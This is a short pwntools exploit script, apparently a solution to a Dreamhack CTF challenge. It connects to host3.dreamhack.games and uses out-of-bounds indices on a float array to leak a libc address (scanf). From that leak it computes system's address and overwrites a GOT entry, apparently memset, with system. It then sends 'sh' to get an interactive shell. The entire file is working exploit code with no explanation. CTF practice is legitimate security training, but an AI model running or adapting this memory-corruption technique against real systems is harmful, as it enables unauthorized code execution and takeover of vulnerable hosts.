from pwn import *
import struct

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 23802
r = remote(HOST, PORT)

def read(idx):
    r.sendlineafter(b'>> ', b'r')
    r.sendlineafter(b'>> ', b'%d'%idx)

def add(idx, val):
    r.sendlineafter(b'>> ', b'a')
    r.sendlineafter(b'>> ', b'%d'%idx)
    r.sendlineafter(b'>> ', b'%f'%val)

add(16, 3.4028234663852886e+38)
read(-25)

u = u32(struct.pack('<f', float(r.recvline().strip())))

read(-26)
l = u32(struct.pack('<f', float(r.recvline().strip())))
scanf = u << 32 | l
libc = scanf - 0x62110
system = libc + 0x50d60

read(-30)
memset = u32(struct.pack('<f', float(r.recvline().strip())))

a = struct.unpack('f', p32(system & 0xffffffff))[0]
b = struct.unpack('f', p32(memset))[0]
add(-30, a-b)

r.sendlineafter(b'>> ', b'sh')

r.interactive()